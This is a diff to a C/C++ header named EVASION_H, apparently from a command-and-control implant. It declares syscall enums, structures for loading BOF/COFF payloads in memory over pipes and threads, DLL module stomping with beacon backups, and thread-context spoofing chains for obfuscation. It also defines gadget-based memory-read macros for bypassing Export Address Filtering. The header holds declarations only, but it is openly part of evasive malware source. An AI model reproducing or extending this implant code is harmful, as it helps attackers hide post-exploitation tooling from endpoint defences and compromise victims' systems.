@@ -50,22 +50,22 @@ typedef _STACK_FRAME STACK_FRAME;
 #define SY_DOWN   12
 #define SY_RANGE  0xE5
 
-typedef enum Sys {
+enum Sys {
     Alloc,
     Protect,
     Write,
     Read,
     Free,
-    CrThread,
+    CreateTd,
     QueueApc,
-    OpenThrd,
+    OpenTd,
     OpenProc,
     MapView,
-    CrSectn,
+    CreateSection,
     OpenPrToken,
     OpenThToken,
-    SetCtxThrd,
-    GetCtxThrd,
+    SetCtxThread,
+    GetCtxThread,
     Last
 };
 
@@ -82,10 +82,16 @@ enum eMask {
     None
 };
 
-enum Reg {
-    eRax,
-    eRsi,
-    eRbx = 0x23
+enum eChainLogic {
+    Default,
+    Stomping1,
+    Stomping2
+};
+
+enum eJmpReg {
+    vRax = 0xE0,
+    vRsi = 0xE6,
+    vRbx = 0x23
 };
 
 /* ========= [ Coff ] ========= */
@@ -103,15 +109,6 @@ enum Reg {
 #define CALLBACK_CUSTOM_LAST     0x13ff
 #define CALLBACK_AX_SCREENSHOT   0x81
 #define CALLBACK_AX_DOWNLOAD_MEM 0x82
-
-struct _BOF_OBJ {
-    PVOID MmBegin;
-    PVOID MmEnd;
-    PVOID Entry;
-
-    struct _BOF_OBJ* Next;
-};
-typedef _BOF_OBJ BOF_OBJ;
 
 struct _DATA_STORE {
     INT32  Type;
@@ -175,7 +172,91 @@ typedef struct _COFF_MAPPED {
     ULONG       ExecCount;         // number of executable sections
 } COFF_MAPPED, *PCOFF_MAPPED;
 
+struct _COFF_SHARED {
+    HANDLE PipeRead;
+    HANDLE PipeWrite;
+
+    HANDLE Event;
+
+    ULONG Cmd;
+    PCHAR Id;
+
+    byte* Args;
+    int   Argc;
+};
+typedef _COFF_SHARED COFF_SHARED;
+
+struct _BOF_OBJ {
+    PVOID MmBegin;
+    PVOID MmEnd;
+    PVOID Entry;
+
+    HANDLE Thread;
+
+    COFF_MAPPED* Mapped;
+    COFF_SHARED* Shared;
+
+    struct _BOF_OBJ* Next;
+};
+typedef _BOF_OBJ BOF_OBJ;
+
 #define POSTEX_LIST_HANDLE      "\x66\x55\x44\x77"
 #define POSTEX_COUNT_HANDLE     "\x77\x44\x55\x66"
+
+struct STOMP_DLL_INFO {
+    HMODULE DllHandle;
+    PVOID   Base;
+    ULONG   TextRVA;
+    PVOID   TextStart;
+    ULONG   TextSize;
+    ULONG   FullSize;
+    CHAR*   DllNamec;
+    WCHAR*  DllNamew;
+    CHAR*   DllPathc;
+    WCHAR*  DllPathw;
+    PVOID   DllBackup;
+    PVOID   BeaconBackup;
+};
+typedef STOMP_DLL_INFO* PSTOMP_DLL_INFO;
+
+struct CHAIN_DATA {
+    ULONG   Time;
+    UINT16* Iterator;
+
+    STOMP_DLL_INFO* StompInfo;
+    STOMP_DLL_INFO* StompInfoNext;
+
+    struct {
+        HANDLE Start;
+        HANDLE End;
+    } Event;
+
+    struct {
+        CONTEXT* Main;
+        CONTEXT* Spoof;
+        CONTEXT* Backup;
+        CONTEXT* Obf;
+    } Context;
+
+    HANDLE MainThread;
+};
+
+auto ReadMmByGadget( UPTR Ptr, UPTR Gadget ) -> UPTR;
+
+#ifndef KH_EAF_BYPASS
+#define KH_EAF_BYPASS 1
+#endif // KH_EAF_BYPASS
+
+#if defined(KH_EAF_BYPASS) && (KH_EAF_BYPASS == 1)
+#define MM_GADGET_READ_08( x ) ((UINT8 )(UPTR)ReadMmByGadget( (UPTR)x, Self->Config.Evasion.EafGadget ))
+#define MM_GADGET_READ_16( x ) ((UINT16)(UPTR)ReadMmByGadget( (UPTR)x, Self->Config.Evasion.EafGadget ))
+#define MM_GADGET_READ_32( x ) ((UINT32)(UPTR)ReadMmByGadget( (UPTR)x, Self->Config.Evasion.EafGadget ))
+#define MM_GADGET_READ_64( x ) ((UINT64)(UPTR)ReadMmByGadget( (UPTR)x, Self->Config.Evasion.EafGadget ))
+#else
+#define MM_GADGET_READ_08( x ) 
+#define MM_GADGET_READ_16( x ) 
+#define MM_GADGET_READ_32( x ) 
+#define MM_GADGET_READ_64( x ) 
+#endif
 
 #endif // EVASION_H
